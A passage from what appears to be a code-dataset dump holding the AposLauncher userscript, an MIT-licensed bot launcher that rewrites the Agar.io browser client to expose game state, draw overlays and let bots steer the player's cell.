""SG-Singapore"",                         SM: ""EU-London"",                         ST: ""EU-London"",                         SA: ""EU-London"",                         SN: ""EU-London"",                         RS: ""EU-London"",                         SC: ""EU-London"",                         SL: ""EU-London"",                         SG: ""JP-Tokyo"",                         SX: ""US-Atlanta"",                         SK: ""EU-London"",                         SI: ""EU-London"",                         SB: ""SG-Singapore"",                         SO: ""EU-London"",                         ZA: ""EU-London"",                         SS: ""EU-London"",                         ES: ""EU-London"",                         LK: ""JP-Tokyo"",                         SD: ""EU-London"",                         SR: ""BR-Brazil"",                         SJ: ""EU-London"",                         SZ: ""EU-London"",                         SE: ""EU-London"",                         CH: ""EU-London"",                         SY: ""EU-London"",                         TW: ""JP-Tokyo"",                         TJ: ""JP-Tokyo"",                         TZ: ""EU-London"",                         TH: ""JP-Tokyo"",                         TL: ""JP-Tokyo"",                         TG: ""EU-London"",                         TK: ""SG-Singapore"",                         TO: ""SG-Singapore"",                         TT: ""US-Atlanta"",                         TN: ""EU-London"",                         TR: ""TK-Turkey"",                         TM: ""JP-Tokyo"",                         TC: ""US-Atlanta"",                         TV: ""SG-Singapore"",                         UG: ""EU-London"",                         UA: ""EU-London"",                         AE: ""EU-London"",                         GB: ""EU-London"",                         US: ""US-Atlanta"",                         UM: ""SG-Singapore"",                         VI: ""US-Atlanta"",                         UY: ""BR-Brazil"",                         UZ: ""JP-Tokyo"",                         VU: ""SG-Singapore"",                         VE: ""BR-Brazil"",                         VN: ""JP-Tokyo"",                         WF: ""SG-Singapore"",                         EH: ""EU-London"",                         YE: ""JP-Tokyo"",                         ZM: ""EU-London"",                         ZW: ""EU-London""                     },                     L = null;                 d.connect = Ca;                  //UPDATE                 /**                  * Tells you if the game is in Dark mode.                  * @return Boolean for dark mode.                  */                 window.getDarkBool = function() {                     return ta;                 }                  /**                  * Tells you if the mass is shown.                  * @return Boolean for player\'s mass.                  */                 window.getMassBool = function() {                     return lb;                 }                  /**                  * This is a copy of everything that is shown on screen.                  * Normally stuff will time out when off the screen, this                  * memorizes everything that leaves the screen for a little                  * while longer.                  * @return The memory object.                  */                 window.getMemoryCells = function() {                     return interNodes;                 }                  /**                  * [getCellsArray description]                  * @return {[type]} [description]                  */                 window.getCellsArray = function() {                     return v;                 }                  /**                  * [getCellsArray description]                  * @return {[type]} [description]                  */                 window.getCells = function() {                     return E;                 }                  /**                  * Returns an array with all the player\'s cells.                  * @return Player\'s cells                  */                 window.getPlayer = function() {                     return k;                 }                  /**                  * The canvas\' width.                  * @return Integer Width                  */                 window.getWidth = function() {                     return m;                 }                  /**                  * The canvas\' height                  * @return Integer Height                  */                 window.getHeight = function() {                     return r;                 }                  /**                  * Scaling ratio of the canvas. The bigger this ration,                  * the further that you see.                  * @return Screen scaling ratio.                  */                 window.getRatio = function() {                     return h;                 }                  /**                  * [getOffsetX description]                  * @return {[type]} [description]                  */                 window.getOffsetX = function() {                     return aa;                 }                  window.getOffsetY = function() {                     return ba;                 }                  window.getX = function() {                     return s;                 }                  window.getY = function() {                     return t;                 }                  window.getPointX = function() {                     return ia;                 }                  window.getPointY = function() {                     return ja;                 }                  /**                  * The X location of the mouse.                  * @return Integer X                  */                 window.getMouseX = function() {                     return fa;                 }                  /**                  * The Y location of the mouse.                  * @return Integer Y                  */                 window.getMouseY = function() {                     return ga;                 }                  window.getMapStartX = function() {                     return pa;                 }                  window.getMapStartY = function() {                     return qa;                 }                  window.getMapEndX = function() {                     return ra;                 }                  window.getMapEndY = function() {                     return sa;                 }                  window.getScreenDistance = function() {                     var temp = screenDistance();                     return temp;                 }                  /**                  * A timestamp since the last time the server sent any data.                  * @return Last update timestamp                  */                 window.getLastUpdate = function() {                     return C;                 }                  window.getCurrentScore = function() {                     return R;                 }                  /**                  * The game\'s current mode. ("":ffa"", "":experimental"", "":teams"". "":party"")                  * @return {[type]} [description]                  */                 window.getMode = function() {                     return P;                 }                  window.setPoint = function(x, y) {                     ia = x;                     ja = y;                 }                  window.setScore = function(a) {                     sessionScore = a * 100;                 }                  window.setBestTime = function(a) {                     bestTime = a;                 }                  window.best = function(a, b) {                     setScore(a);                     setBestTime(b);                 }                  window.setBotIndex = function(a) {                     console.log(""Changing bot"");                     botIndex = a;                 }                  window.setMessage = function(a) {                     message = a;                 }                 window.updateBotList = function() {                     window.bot",,3
0,https://github.com/Lifestylerr/DAWD.git,"/*The MIT License (MIT) Copyright (c) 2015 Apostolique Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.*/ // ==UserScript== // @name        AposLauncher // @namespace   AposLauncher // @include     http://agar.io/* // @version     4.124 // @grant       none // @author      http://www.twitch.tv/apostolique // ==/UserScript== var aposLauncherVersion = 4.124;  Number.prototype.mod = function(n) {     return ((this % n) + n) % n; };  Array.prototype.peek = function() {     return this[this.length - 1]; };  var sha = ""efde0488cc2cc176db48dd23b28a20b90314352b"";  function getLatestCommit() {     window.jQuery.ajax({         url: ""https://api.github.com/repos/apostolique/Agar.io-bot/git/refs/heads/master"",         cache: false,         dataType: ""jsonp""     }).done(function(data) {         console.dir(data.data);         console.log(""hmm: "" + data.data.object.sha);         sha = data.data.object.sha;          function update(prefix, name, url) {             window.jQuery(document.body).prepend(""<div id=\'"" + prefix + ""Dialog\' style=\'position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 100; display: none;\'>"");             window.jQuery(\'#\' + prefix + \'Dialog\').append(""<div id=\'"" + prefix + ""Message\' style=\'width: 350px; background-color: #FFFFFF; margin: 100px auto; border-radius: 15px; padding: 5px 15px 5px 15px;\'>"");             window.jQuery(\'#\' + prefix + \'Message\').append(""<h2>UPDATE TIME!!!</h2>"");             window.jQuery(\'#\' + prefix + \'Message\').append(""<p>Grab the update for: <a id=\'"" + prefix + ""Link\' href=\'"" + url + ""\' target=\\""_blank\\"">"" + name + ""</a></p>"");             window.jQuery(\'#\' + prefix + \'Link\').on(\'click\', function() {                 window.jQuery(""#"" + prefix + ""Dialog"").hide();                 window.jQuery(""#"" + prefix + ""Dialog"").remove();             });             window.jQuery(""#"" + prefix + ""Dialog"").show();         }          window.jQuery.get(\'https://raw.githubusercontent.com/Apostolique/Agar.io-bot/master/launcher.user.js?\' + Math.floor((Math.random() * 1000000) + 1), function(data) {             var latestVersion = data.replace(/(\\r\\n|\\n|\\r)/gm, """");             latestVersion = latestVersion.substring(latestVersion.indexOf(""// @version"") + 11, latestVersion.indexOf(""// @grant""));              latestVersion = parseFloat(latestVersion + 0.0000);             var myVersion = parseFloat(aposLauncherVersion + 0.0000);              if (latestVersion > myVersion) {                 update(""aposLauncher"", ""launcher.user.js"", ""https://github.com/Apostolique/Agar.io-bot/blob/"" + sha + ""/launcher.user.js/"");             }             console.log(\'Current launcher.user.js Version: \' + myVersion + "" on Github: "" + latestVersion);         });      }).fail(function() {}); } getLatestCommit();  console.log(""Running Bot Launcher!""); (function(d, e) {      //UPDATE     function keyAction(e) {         if (84 == e.keyCode) {             console.log(""Toggle"");             toggle = !toggle;         }         if (82 == e.keyCode) {             console.log(""ToggleDraw"");             toggleDraw = !toggleDraw;         }         if (68 == e.keyCode) {             window.setDarkTheme(!getDarkBool());         }         if (70 == e.keyCode) {             window.setShowMass(!getMassBool());         }         if (69 == e.keyCode) {             if (message.length > 0) {                 window.setMessage([]);                 window.onmouseup = function() {};                 window.ignoreStream = true;             } else {                 window.ignoreStream = false;                 window.refreshTwitch();             }         }         window.botList[botIndex].keyAction(e);     }      function humanPlayer() {         //Don\'t need to do anything.         return [getPointX(), getPointY()];     }        function pb() {          //UPDATE          window.botList = window.botList || [];          window.jQuery(\'#nick\').val(originalName);          function HumanPlayerObject() {             this.name = ""Human"";             this.keyAction = function(key) {};             this.displayText = function() {                 return [];             };             this.mainLoop = humanPlayer;         }          var hpo = new HumanPlayerObject();          window.botList.push(hpo);          window.updateBotList();          ya = !0;         Pa();         setInterval(Pa, 18E4);          var father = window.jQuery(""#canvas"").parent();         window.jQuery(""#canvas"").remove();         father.prepend(""<canvas id=\'canvas\'>"");          G = za = document.getElementById(""canvas"");         f = G.getContext(""2d"");         G.onmousedown = function(a) {             if (Qa) {                 var b = a.clientX - (5 + m / 5 / 2),                     c = a.clientY - (5 + m / 5 / 2);                 if (Math.sqrt(b * b + c * c) <= m / 5 / 2) {                     V();                     H(17);                     return                 }             }             fa = a.clientX;             ga = a.clientY;             Aa();             V();         };         G.onmousemove = function(a) {             fa = a.clientX;             ga = a.clientY;             Aa();         };         G.onmouseup = function() {};         /firefox/i.test(navigator.userAgent) ? document.addEventListener(""DOMMouseScroll"", Ra, !1) : document.body.onmousewheel = Ra;         var a = !1,             b = !1,             c = !1;         d.onkeydown = function(l) {             //UPDATE             if (!window.jQuery(\'#nick\').is("":focus"")) {                 32 != l.keyCode || a || (V(), H(17), a = !0);                 81 != l.keyCode || b || (H(18), b = !0);                 87 != l.keyCode || c || (V(), H(21), c = !0);                 27 == l.keyCode && Sa(!0);                  //UPDATE                 keyAction(l);             }         };         d.onkeyup = function(l) {             32 == l.keyCode && (a = !1);             87 == l.keyCode && (c = !1);             81 == l.keyCode && b && (H(19), b = !1);         };         d.onblur = function() {             H(19);             c = b = a = !1         };         d.onresize = Ta;         d.requestAnimationFrame(Ua);         setInterval(V, 40);         y && e(""#region"").val(y);         Va();         ha(e(""#region"").val());         0 == Ba && y && I();         W = !0;         e(""#overlays"").show();         Ta();         d.location.hash && 6 <= d.location.hash.length && Wa(d.location.hash)     }      function Ra(a) {         J *= Math.pow(.9, a.wheelDelta / -120 || a.detail || 0);         //UPDATE         0.07 > J && (J = 0.07);         J > 4 / h && (J = 4 / h)     }      function qb() {         if (.4 > h) X = null;         else {             for (var a = Number.POSITIVE_INFINITY, b = Number.POSITIVE_INFINITY, c = Number.NEGATIVE_INFINITY, l = Number.NEGATIVE_INFINITY, d = 0, p = 0; p < v.length; p++) {                 var g = v[p];                 !g.N() || g.R || 20 >= g.size * h || (d = Math.max(g.size, d), a = Math.min(g.x, a), b = Math.min(g.y, b), c = Math.max(g.x, c), l = Math.max(g.y, l))             }             X = rb.ka({                 ca: a - 10,                 da: b - 10,                 oa: c + 10,                 pa: l + 10,                 ma: 2,                 na: 4             });             for (p = 0; p < v.length; p++)                 if (g = v[p],                     g.N() && !(20 >= g.size * h))                     for (a = 0; a < g.a.length; ++a) b = g.a[a].x, c = g.a[a].y, b < s - m / 2 / h || c < t - r / 2 / h || b > s + m / 2 / h || c > t + r / 2 / h || X.m(g.a[a])         }     }      function Aa() {         //UPDATE         if (toggle || window.botList[botIndex].name == ""Human"") {             setPoint(((fa - m / 2) / h + s), ((ga - r / 2) / h + t));         }     }      function Pa() {         null == ka && (ka = {}, e(""#region"").children().each(function() {             var a = e(this),                 b = a.val();             b && (ka[b] = a.text())         }));         e.get(""https://m.agar.io/info"", function(a) {                 var b = {},                     c;                 for (c in a.regions) {                     var l = c.split("":"")[0];                     b[l] = b[l] || 0;                     b[l] += a.regions[c].numPlayers                 }                 for (c in b) e(\'#region option[value=""\' + c + \'""]\').text(ka[c] + "" ("" + b[c] + "" players)"")             },             ""json"")     }      function Xa() {         e(""#adsBottom"").hide();         e(""#overlays"").hide();         W = !1;         Va();         d.googletag && d.googletag.pubads && d.googletag.pubads().clear(d.aa)     }      function ha(a) {         a && a != y && (e(""#region"").val() != a && e(""#region"").val(a), y = d.localStorage.location = a, e("".region-message"").hide(), e("".region-message."" + a).show(), e("".btn-needs-server"").prop(""disabled"", !1), ya && I())     }      function Sa(a) {         W || (K = null, sb(), a && (x = 1), W = !0, e(""#overlays"").fadeIn(a ? 200 : 3E3))     }      function Y(a) {         e(""#helloContainer"").attr(""data-gamemode"", a);         P = a;         e(""#gamemode"").val(a)     }      function Va() {         e(""#region"").val() ? d.localStorage.location = e(""#region"").val() : d.localStorage.location && e(""#region"").val(d.localStorage.location);         e(""#region"").val() ? e(""#locationKnown"").append(e(""#region"")) : e(""#locationUnknown"").append(e(""#region""))     }      function sb() {         la && (la = !1, setTimeout(function() {             la = !0                 //UPDATE         }, 6E4 * Ya))     }      function Z(a) {         return d.i18n[a] || d.i18n_dict.en[a] || a     }      function Za() {         var a = ++Ba;         console.log(""Find "" + y + P);         e.ajax(""https://m.agar.io/findServer"", {             error: function() {                 setTimeout(Za, 1E3)             },             success: function(b) {                 a == Ba && (b.alert && alert(b.alert), Ca(""ws://"" + b.ip, b.token))             },             dataType: ""json"",             method: ""POST"",             cache: !1,             crossDomain: !0,             data: (y + P || ""?"") + ""\\n154669603""         })     }      function I() {         ya && y && (e(""#connecting"").show(), Za())     }      function Ca(a, b) {         if (q) {             q.onopen = null;             q.onmessage = null;             q.onclose = null;             try {                 q.close()             } catch (c) {}             q = null         }         Da.la && (a = ""ws://"" + Da.la);         if (null != L) {             var l = L;             L = function() {                 l(b)             }         }         if (tb) {             var d = a.split("":"");             a = d[0] + ""s://ip-"" + d[1].replace(/\\./g, ""-"").replace(/\\//g, """") + "".tech.agar.io:"" + (+d[2] + 2E3)         }         M = [];         k = [];         E = {};         v = [];         Q = [];         F = [];         z = A = null;         R = 0;         $ = !1;         console.log(""Connecting to "" + a);         //UPDATE         serverIP = a;         q = new WebSocket(a);         q.binaryType = ""arraybuffer"";         q.onopen = function() {             var a;             console.log(""socket open"");             a = N(5);             a.setUint8(0, 254);             a.setUint32(1, 5, !0);             O(a);             a = N(5);             a.setUint8(0, 255);             a.setUint32(1, 154669603, !0);             O(a);             a = N(1 + b.length);             a.setUint8(0, 80);             for (var c = 0; c < b.length; ++c) a.setUint8(c + 1, b.charCodeAt(c));             O(a);             $a()         };         q.onmessage = ub;         q.onclose = vb;         q.onerror = function() {             console.log(""socket error"")         }     }      function N(a) {         return new DataView(new ArrayBuffer(a))     }      function O(a) {         q.send(a.buffer)     }      function vb() {         $ && (ma = 500);         console.log(""socket close"");         setTimeout(I, ma);         ma *= 2     }      function ub(a) {         wb(new DataView(a.data))     }      function wb(a) {         function b() {             for (var b = """";;) {                 var d = a.getUint16(c, !0);                 c += 2;                 if (0 == d) break;                 b += String.fromCharCode(d)             }             return b         }         var c = 0;         240 == a.getUint8(c) && (c += 5);         switch (a.getUint8(c++)) {             case 16:                 xb(a, c);                 break;             case 17:                 aa = a.getFloat32(c, !0);                 c += 4;                 ba = a.getFloat32(c, !0);                 c += 4;                 ca = a.getFloat32(c, !0);                 c += 4;                 break;             case 20:                 k = [];                 M = [];                 break;             case 21:                 Ea = a.getInt16(c, !0);                 c += 2;                 Fa = a.getInt16(c, !0);                 c += 2;                 Ga || (Ga = !0, na = Ea, oa = Fa);                 break;             case 32:                 M.push(a.getUint32(c, !0));                 c += 4;                 break;             case 49:                 if (null != A) break;                 var l = a.getUint32(c, !0),                     c = c + 4;                 F = [];                 for (var d = 0; d < l; ++d) {                     var p = a.getUint32(c, !0),                         c = c + 4;                     F.push({                         id: p,                         name: b()                     })                 }                 ab();                 break;             case 50:                 A = [];                 l = a.getUint32(c, !0);                 c += 4;                 for (d = 0; d < l; ++d) A.push(a.getFloat32(c, !0)), c += 4;                 ab();                 break;             case 64:                 pa = a.getFloat64(c, !0);                 c += 8;                 qa = a.getFloat64(c, !0);                 c += 8;                 ra = a.getFloat64(c, !0);                 c += 8;                 sa = a.getFloat64(c, !0);                 c += 8;                 aa = (ra + pa) / 2;                 ba = (sa + qa) / 2;                 ca = 1;                 0 == k.length && (s = aa, t = ba, h = ca);                 break;             case 81:                 var g = a.getUint32(c, !0),                     c = c + 4,                     e = a.getUint32(c, !0),                     c = c + 4,                     f = a.getUint32(c, !0),                     c = c + 4;                 setTimeout(function() {                     S({                         e: g,                         f: e,                         d: f                     })                 }, 1200)         }     }      function xb(a, b) {         bb = C = Date.now();         $ || ($ = !0, e(""#connecting"").hide(), cb(), L && (L(), L = null));         var c = Math.random();         Ha = !1;         var d = a.getUint16(b, !0);         b += 2;         for (var u = 0; u < d; ++u) {             var p = E[a.getUint32(b, !0)],                 g = E[a.getUint32(b + 4, !0)];             b += 8;             p && g && (g.X(), g.s = g.x, g.t = g.y, g.r = g.size, g.J = p.x, g.K = p.y, g.q = g.size, g.Q =                 C)         }         for (u = 0;;) {             d = a.getUint32(b, !0);             b += 4;             if (0 == d) break;             ++u;             var f, p = a.getInt16(b, !0);             b += 4;             g = a.getInt16(b, !0);             b += 4;             f = a.getInt16(b, !0);             b += 2;             for (var h = a.getUint8(b++), w = a.getUint8(b++), m = a.getUint8(b++), h = (h << 16 | w << 8 | m).toString(16); 6 > h.length;) h = ""0"" + h;             var h = ""#"" + h,                 w = a.getUint8(b++),                 m = !!(w & 1),                 r = !!(w & 16);             w & 2 && (b += 4);             w & 4 && (b += 8);             w & 8 && (b += 16);             for (var q, n = """";;) {                 q = a.getUint16(b, !0);                 b += 2;                 if (0 == q) break;                 n += String.fromCharCode(q)             }             q = n;             n = null;             E.hasOwnProperty(d) ? (n = E[d], n.P(), n.s = n.x, n.t = n.y, n.r = n.size, n.color = h) :                 (n = new da(d, p, g, f, h, q), v.push(n), E[d] = n, n.ua = p, n.va = g);             n.h = m;             n.n = r;             n.J = p;             n.K = g;             n.q = f;             n.sa = c;             n.Q = C;             n.ba = w;             q && n.B(q); - 1 != M.indexOf(d) && -1 == k.indexOf(n) && (document.getElementById(""overlays"").style.display = ""none"", k.push(n), n.birth = getLastUpdate(), n.birthMass = (n.size * n.size / 100), 1 == k.length && (s = n.x, t = n.y, db()))              //UPDATE             interNodes[d] = window.getCells()[d];         }          //UPDATE         Object.keys(interNodes).forEach(function(element, index) {             //console.log(""start: "" + interNodes[element].updateTime + "" current: "" + D + "" life: "" + (D - interNodes[element].updateTime));             var isRemoved = !window.getCells().hasOwnProperty(element);              //console.log(""Time not updated: "" + (window.getLastUpdate() - interNodes[element].getUptimeTime()));             if (isRemoved && (window.getLastUpdate() - interNodes[element].getUptimeTime()) > 3000) {                 delete interNodes[element];             } else {                 for (var i = 0; i < getPlayer().length; i++) {                     if (isRemoved && computeDistance(getPlayer()[i].x, getPlayer()[i].y, interNodes[element].x, interNodes[element].y) < getPlayer()[i].size + 710) {                          delete interNodes[element];                         break;                     }                 }             }         });          c = a.getUint32(b, !0);         b += 4;         for (u = 0; u < c; u++) d = a.getUint32(b, !0), b += 4, n = E[d], null != n && n.X();         //UPDATE         //Ha && 0 == k.length && Sa(!1)     }      //UPDATE     function computeDistance(x1, y1, x2, y2) {         var xdis = x1 - x2; // <--- FAKE AmS OF COURSE!         var ydis = y1 - y2;         var distance = Math.sqrt(xdis * xdis + ydis * ydis);          return distance;     }      /**      * Some horse shit of some sort.      * @return Horse Shit      */     function screenDistance() {         return Math.min(computeDistance(getOffsetX(), getOffsetY(), screenToGameX(getWidth()), getOffsetY()), computeDistance(getOffsetX(), getOffsetY(), getOffsetX(), screenToGameY(getHeight())));     }      window.verticalDistance = function() {         return computeDistance(screenToGameX(0), screenToGameY(0), screenToGameX(getWidth()), screenToGameY(getHeight()));     }      /**      * A conversion from the screen\'s horizontal coordinate system      * to the game\'s horizontal coordinate system.      * @param x in the screen\'s coordinate system      * @return x in the game\'s coordinate system      */     window.screenToGameX = function(x) {         return (x - getWidth() / 2) / getRatio() + getX();     }      /**      * A conversion from the screen\'s vertical coordinate system      * to the game\'s vertical coordinate system.      * @param y in the screen\'s coordinate system      * @return y in the game\'s coordinate system      */     window.screenToGameY = function(y) {         return (y - getHeight() / 2) / getRatio() + getY();     }      window.drawPoint = function(x_1, y_1, drawColor, text) {         if (!toggleDraw) {             dPoints.push([x_1, y_1, drawColor]);             dText.push(text);         }     }      window.drawArc = function(x_1, y_1, x_2, y_2, x_3, y_3, drawColor) {         if (!toggleDraw) {             var radius = computeDistance(x_1, y_1, x_3, y_3);             dArc.push([x_1, y_1, x_2, y_2, x_3, y_3, radius, drawColor]);         }     }      window.drawLine = function(x_1, y_1, x_2, y_2, drawColor) {         if (!toggleDraw) {             lines.push([x_1, y_1, x_2, y_2, drawColor]);         }     }      window.drawCircle = function(x_1, y_1, radius, drawColor) {         if (!toggleDraw) {             circles.push([x_1, y_1, radius, drawColor]);         }     }      function V() {          //UPDATE         if (getPlayer().length == 0 && !reviving && ~~(getCurrentScore() / 100) > 0) {             console.log(""Dead: "" + ~~(getCurrentScore() / 100));             apos(\'send\', \'pageview\');         }          if (getPlayer().length == 0) {             console.log(""Revive"");             setNick(originalName);             reviving = true;         } else if (getPlayer().length > 0 && reviving) {             reviving = false;             console.log(""Done Reviving!"");         }          if (T()) {             var a = fa - m / 2;             var b = ga - r / 2;             64 > a * a + b * b || .01 > Math.abs(eb - ia) &&                 .01 > Math.abs(fb - ja) || (eb = ia, fb = ja, a = N(13), a.setUint8(0, 16), a.setInt32(1, ia, !0), a.setInt32(5, ja, !0), a.setUint32(9, 0, !0), O(a))         }     }      function cb() {         if (T() && $ && null != K) {             var a = N(1 + 2 * K.length);             a.setUint8(0, 0);             for (var b = 0; b < K.length; ++b) a.setUint16(1 + 2 * b, K.charCodeAt(b), !0);             O(a)         }     }      function T() {         return null != q && q.readyState == q.OPEN     }      window.opCode = function(a) {         console.log(""Sending op code."");         H(parseInt(a));     }      function H(a) {         if (T()) {             var b = N(1);             b.setUint8(0, a);             O(b)         }     }      function $a() {         if (T() && null != B) {             var a = N(1 + B.length);             a.setUint8(0, 81);             for (var b = 0; b < B.length; ++b) a.setUint8(b + 1, B.charCodeAt(b));             O(a)         }     }      function Ta() {         m = d.innerWidth;         r = d.innerHeight;         za.width = G.width = m;         za.height = G.height = r;         var a = e(""#helloContainer"");         a.css(""transform"", ""none"");         var b = a.height(),             c = d.innerHeight;         b > c / 1.1 ? a.css(""transform"", ""translate(-50%, -50%) scale("" + c / b / 1.1 + "")"") : a.css(""transform"", ""translate(-50%, -50%)"");         gb()     }      function hb() {         var a;         a = Math.max(r / 1080, m / 1920);         return a *= J     }      function yb() {         if (0 != k.length) {             for (var a = 0, b = 0; b < k.length; b++) a += k[b].size;             a = Math.pow(Math.min(64 / a, 1), .4) * hb();             h = (9 * h + a) / 10         }     }      function gb() {         //UPDATE         dPoints = [];         circles = [];         dArc = [];         dText = [];         lines = [];           var a, b = Date.now();         ++zb;         C = b;         if (0 < k.length) {             yb();             for (var c = a = 0, d = 0; d < k.length; d++) k[d].P(), a += k[d].x / k.length, c += k[d].y / k.length;             aa = a;             ba = c;             ca = h;             s = (s + a) / 2;             t = (t + c) / 2;         } else s = (29 * s + aa) / 30, t = (29 * t + ba) / 30, h = (9 * h + ca * hb()) / 10;         qb();         Aa();         Ia || f.clearRect(0, 0, m, r);         Ia ? (f.fillStyle = ta ? ""#111111"" : ""#F2FBFF"", f.globalAlpha = .05, f.fillRect(0, 0, m, r), f.globalAlpha = 1) : Ab();         v.sort(function(a, b) {             return a.size == b.size ? a.id - b.id : a.size - b.size         });         f.save();         f.translate(m / 2, r / 2);         f.scale(h, h);         f.translate(-s, -t);         //UPDATE         f.save();         f.beginPath();         f.lineWidth = 5;         f.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');         f.moveTo(getMapStartX(), getMapStartY());         f.lineTo(getMapStartX(), getMapEndY());         f.stroke();         f.moveTo(getMapStartX(), getMapStartY());         f.lineTo(getMapEndX(), getMapStartY());         f.stroke();         f.moveTo(getMapEndX(), getMapStartY());         f.lineTo(getMapEndX(), getMapEndY());         f.stroke();         f.moveTo(getMapStartX(), getMapEndY());         f.lineTo(getMapEndX(), getMapEndY());         f.stroke();         f.restore();          for (d = 0; d < v.length; d++) v[d].w(f);         for (d = 0; d < Q.length; d++) Q[d].w(f);         //UPDATE         if (getPlayer().length > 0) {             var moveLoc = window.botList[botIndex].mainLoop();             if (!toggle) {                 setPoint(moveLoc[0], moveLoc[1]);             }         }         customRender(f);         if (Ga) {             na = (3 * na + Ea) / 4;             oa = (3 * oa + Fa) / 4;             f.save();             f.strokeStyle = ""#FFAAAA"";             f.lineWidth = 10;             f.lineCap = ""round"";             f.lineJoin = ""round"";             f.globalAlpha = .5;             f.beginPath();             for (d = 0; d < k.length; d++) f.moveTo(k[d].x, k[d].y), f.lineTo(na, oa);             f.stroke();             f.restore();         }         f.restore();         z && z.width && f.drawImage(z, m - z.width - 10, 10);         R = Math.max(R, Bb());          //UPDATE          var currentDate = new Date();          var nbSeconds = 0;         if (getPlayer().length > 0) {             //nbSeconds = currentDate.getSeconds() + currentDate.getMinutes() * 60 + currentDate.getHours() * 3600 - lifeTimer.getSeconds() - lifeTimer.getMinutes() * 60 - lifeTimer.getHours() * 3600;             nbSeconds = (currentDate.getTime() - lifeTimer.getTime()) / 1000;         }          bestTime = Math.max(nbSeconds, bestTime);          var displayText = \'Score: \' + ~~(R / 100) + "" Current Time: "" + nbSeconds + "" seconds."";          0 != R && (null == ua && (ua = new va(24, ""#FFFFFF"")), ua.C(displayText), c = ua.L(), a = c.width, f.globalAlpha = .2, f.fillStyle = ""#000000"", f.fillRect(10, r - 10 - 24 - 10, a + 10, 34), f.globalAlpha = 1, f.drawImage(c, 15, r -             10 - 24 - 5));         Cb();         b = Date.now() - b;         b > 1E3 / 60 ? D -= .01 : b < 1E3 / 65 && (D += .01);.4 > D && (D = .4);         1 < D && (D = 1);         b = C - ib;         !T() || W ? (x += b / 2E3, 1 < x && (x = 1)) : (x -= b / 300, 0 > x && (x = 0));         0 < x && (f.fillStyle = ""#000000"", f.globalAlpha = .5 * x, f.fillRect(0, 0, m, r), f.globalAlpha = 1);         ib = C          drawStats(f);     }      //UPDATE     function customRender(d) {         d.save();         for (var i = 0; i < lines.length; i++) {             d.beginPath();              d.lineWidth = 5;              if (lines[i][4] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (lines[i][4] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (lines[i][4] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (lines[i][4] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (lines[i][4] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (lines[i][4] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (lines[i][4] == 6) {                 d.strokeStyle = ""#008080"";             } else if (lines[i][4] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }              d.moveTo(lines[i][0], lines[i][1]);             d.lineTo(lines[i][2], lines[i][3]);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < circles.length; i++) {             if (circles[i][3] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (circles[i][3] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (circles[i][3] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (circles[i][3] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (circles[i][3] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (circles[i][3] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (circles[i][3] == 6) {                 d.strokeStyle = ""#008080"";             } else if (circles[i][3] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }             d.beginPath();              d.lineWidth = 10;             //d.setLineDash([5]);             d.globalAlpha = 0.3;              d.arc(circles[i][0], circles[i][1], circles[i][2], 0, 2 * Math.PI, false);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < dArc.length; i++) {             if (dArc[i][7] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (dArc[i][7] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (dArc[i][7] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (dArc[i][7] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (dArc[i][7] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (dArc[i][7] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (dArc[i][7] == 6) {                 d.strokeStyle = ""#008080"";             } else if (dArc[i][7] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }              d.beginPath();              d.lineWidth = 5;              var ang1 = Math.atan2(dArc[i][1] - dArc[i][5], dArc[i][0] - dArc[i][4]);             var ang2 = Math.atan2(dArc[i][3] - dArc[i][5], dArc[i][2] - dArc[i][4]);              d.arc(dArc[i][4], dArc[i][5], dArc[i][6], ang1, ang2, false);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < dPoints.length; i++) {             if (dText[i] == """") {                 var radius = 10;                  d.beginPath();                 d.arc(dPoints[i][0], dPoints[i][1], radius, 0, 2 * Math.PI, false);                  if (dPoints[i][2] == 0) {                     d.fillStyle = ""black"";                 } else if (dPoints[i][2] == 1) {                     d.fillStyle = ""yellow"";                 } else if (dPoints[i][2] == 2) {                     d.fillStyle = ""blue"";                 } else if (dPoints[i][2] == 3) {                     d.fillStyle = ""red"";                 } else if (dPoints[i][2] == 4) {                     d.fillStyle = 